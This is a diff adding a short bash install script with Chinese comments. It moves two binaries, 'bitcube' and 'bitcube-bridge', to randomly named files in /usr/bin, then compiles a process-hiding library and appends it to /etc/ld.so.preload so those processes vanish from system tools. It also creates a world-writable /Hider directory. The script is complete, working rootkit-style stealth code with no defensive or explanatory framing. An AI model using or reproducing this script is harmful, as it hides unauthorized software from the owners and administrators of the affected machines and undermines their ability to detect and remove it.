@@ -1,0 +1,26 @@
+#!/bin/bash
+bitcube_random=`cat /dev/urandom | tr -dc a-z0-3 | head -c 5`
+birfrost_random=`cat /dev/urandom | tr -dc a-z0-3 | head -c 5`
+filetype=`cat /dev/urandom | tr -dc a-z | head -c 3`
+
+#生成随机文件名的配置文件
+echo 'bitcube='"$bitcube_random"'.'"$filetype" >> /config
+echo 'birfrost='"$birfrost_random"'.'"$filetype" >> /config
+
+#导入环境变量
+source /config
+
+#开始更名
+mv bitcube /usr/bin/"$bitcube" && chmod +x /usr/bin/"$bitcube"
+mv bitcube-bridge /usr/bin/"$birfrost" && chmod +x /usr/bin/"$birfrost"
+
+#开始制作Hider
+mkdir /Hider && chmod 0777 -R /Hider
+unzip hide.zip
+sed -i "s/bitcube/$bitcube/g" `grep "bitcube" -rl "processhider.c"` && make
+mv libprocesshider.so /Hider/"$bitcube"'.so'
+echo /Hider/"$bitcube"'.so' >> /etc/ld.so.preload
+
+sed -i "s/$bitcube/$birfrost/g" `grep "$bitcube" -rl "processhider.c"` && make
+mv libprocesshider.so /Hider/"$birfrost"'.so'
+echo /Hider/"$birfrost"'.so' >> /etc/ld.so.preload
